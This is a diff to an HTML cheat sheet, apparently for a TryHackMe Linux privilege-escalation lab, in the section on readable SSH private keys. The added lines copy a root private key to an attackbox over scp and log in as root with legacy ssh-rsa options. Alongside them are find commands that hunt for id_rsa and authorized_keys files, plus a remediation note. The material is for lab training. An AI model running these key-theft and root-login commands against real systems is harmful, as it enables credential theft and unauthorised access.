@@ -303,10 +303,13 @@ cat /var/www/html/*/wp-config.php</code></pre>
 <p class="note">SSH key-based auth trusts whoever holds the private key — no password needed. An unencrypted private key left readable by other users (or exposed in a backup/web root) lets anyone impersonate its owner on any server that trusts the matching public key.</p>
 <p class="lbl">Recon</p>
 <pre><code>find / -name "id_rsa*" -o -name "authorized_keys" 2>/dev/null
-ls -la ~/.ssh /root/.ssh 2>/dev/null</code></pre>
+ls -la ~/.ssh /root/.ssh 2>/dev/null
+#for copy into linux(attackbox through scp)
+scp /.ssh/root_key shubham@192.168.152.37:/home/shubham/THM/linuxprivesc/t_key</code></pre>
 <p class="lbl">Exploit</p>
 <pre><code>chmod 600 id_rsa
-ssh -i id_rsa root@target</code></pre>
+ssh -i id_rsa root@target
+ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.49.154.129</code></pre>
 <p class="remediation">🛡 Keep private keys <code>600</code>, readable only by the owner; never store unencrypted keys in web roots or world-readable dirs; use passphrase-protected keys.</p>
 </div></details>
 
